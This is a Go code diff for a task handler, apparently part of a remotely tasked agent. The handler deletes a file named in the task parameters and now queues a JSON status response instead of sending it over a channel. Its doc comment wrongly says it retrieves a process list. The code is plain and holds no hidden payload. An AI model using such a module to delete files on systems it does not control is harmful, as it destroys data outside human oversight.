@@ -5,29 +5,48 @@ import (
 	"os"
 
 	"pkg/utils/structs"
+	"sync"
+	"pkg/profiles"
+	"encoding/json"
 )
 
+var mu sync.Mutex
+
 //Run - interface method that retrieves a process list
-func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
-	tMsg := structs.ThreadMsg{}
-	tMsg.Error = false
-	tMsg.TaskItem = task
+func Run(task structs.Task) {
+	msg := structs.Response{}
+	msg.TaskID = task.TaskID
 
 	if _, err := os.Stat(task.Params); os.IsNotExist(err) {
-		tMsg.TaskResult = []byte(fmt.Sprintf("File '%s' does not exist.", task.Params))
-		tMsg.Error = true
-		threadChannel <- tMsg
+
+		msg.UserOutput = fmt.Sprintf("File '%s' does not exist.", task.Params)
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 
 	err := os.Remove(task.Params)
 	if err != nil {
-		tMsg.TaskResult = []byte(err.Error())
-		tMsg.Error = true
-		threadChannel <- tMsg
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
-    tMsg.Completed = true
-	tMsg.TaskResult = []byte(fmt.Sprintf("Deleted %s", task.Params))
-	threadChannel <- tMsg
+    msg.Completed = true
+	msg.UserOutput = fmt.Sprintf("Deleted %s", task.Params)
+	resp, _ := json.Marshal(msg)
+	mu.Lock()
+	profiles.TaskResponses = append(profiles.TaskResponses, resp)
+	mu.Unlock()
+	return
 }
